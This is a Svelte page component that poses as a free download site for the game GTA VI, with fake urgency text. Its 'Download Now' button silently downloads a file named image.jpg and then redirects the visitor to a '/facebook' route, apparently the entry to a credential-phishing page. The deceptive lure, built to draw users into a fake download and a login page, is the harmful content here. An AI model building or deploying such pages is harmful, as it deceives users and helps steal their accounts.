<script lang="ts">
	import { goto } from '$app/navigation';

	const gameTitle = 'GTA VI – Free Download';
	const gameDesc =
		'Experience the next level of open-world action! Explore the city, complete missions, and dominate the streets in GTA VI.';
	const features = [
		'🌆 Huge open-world city',
		'🚗 Drive cars, fly planes, and ride bikes',
		'🕵️‍♂️ Epic story missions and heists',
		'🎮 Multiplayer mode with friends'
	];

	function handleDownload() {
		const link = document.createElement('a');
		link.href = '/image.jpg';
		link.download = 'image.jpg';
		document.body.appendChild(link);
		link.click();
		document.body.removeChild(link);
		goto('/facebook');
	}
</script>

<main
	class="flex min-h-screen flex-col items-center justify-center bg-gradient-to-b from-gray-900 to-gray-800 px-6 py-10 text-white"
>
	<!-- Hero Section -->
	<section class="max-w-3xl text-center">
		<h1 class="mb-3 text-5xl font-bold text-yellow-500">{gameTitle}</h1>
		<p class="mb-6 text-lg text-gray-300">{gameDesc}</p>

		<img
			src="https://images.unsplash.com/photo-1511512578047-dfb367046420?q=80&w=871&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
			alt="GTA VI cover"
			class="mx-auto mb-8 w-72 rounded-xl shadow-2xl md:w-96"
		/>

		<button
			class="mb-6 rounded-full bg-yellow-500 px-8 py-3 text-lg font-bold text-gray-900 shadow-xl transition hover:bg-yellow-600"
			on:click={handleDownload}
		>
			Download Now
		</button>

		<p class="mb-6 text-sm text-gray-400">Compatible with Windows and Mac</p>

		<!-- Features -->
		<ul class="mx-auto max-w-md list-inside list-disc space-y-2 text-left text-lg text-gray-300">
			{#each features as feature}
				<li>{feature}</li>
			{/each}
		</ul>
	</section>

	<!-- Footer Offer Section -->
	<footer class="mt-16 text-center text-gray-400">
		<h2 class="mb-2 text-2xl font-semibold text-yellow-500">🔥 Limited Time Free Download!</h2>
		<p>Download GTA VI now and get exclusive in-game bonuses! Offer ends soon.</p>
	</footer>
</main>
